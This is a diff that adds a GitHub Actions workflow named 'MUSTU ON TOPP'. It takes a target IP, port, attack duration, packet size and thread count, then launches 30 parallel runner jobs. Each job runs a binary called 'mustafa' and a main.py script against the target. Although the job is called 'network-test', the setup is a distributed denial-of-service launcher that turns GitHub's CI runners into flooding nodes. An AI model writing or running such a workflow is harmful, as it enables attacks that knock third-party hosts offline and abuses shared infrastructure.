@@ -1,0 +1,38 @@
+name: "MUSTU ON TOPP"
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+        type: string
+      port:
+        description: "Target Port" 
+        required: true
+        type: string
+      duration:
+        description: "Attack Duration"
+        required: true
+        type: string
+      packet_size:
+        description: "Packet Size"
+        required: true
+        type: string
+      threads:
+        description: "Connection Threads"
+        required: true
+        type: string
+
+jobs:
+  network-test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    - name: Make binary executable  
+      run: chmod +x mustafa
+    - name: Run Network Test
+      run: python3 main.py ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} ${{ inputs.packet_size }} ${{ inputs.threads }}
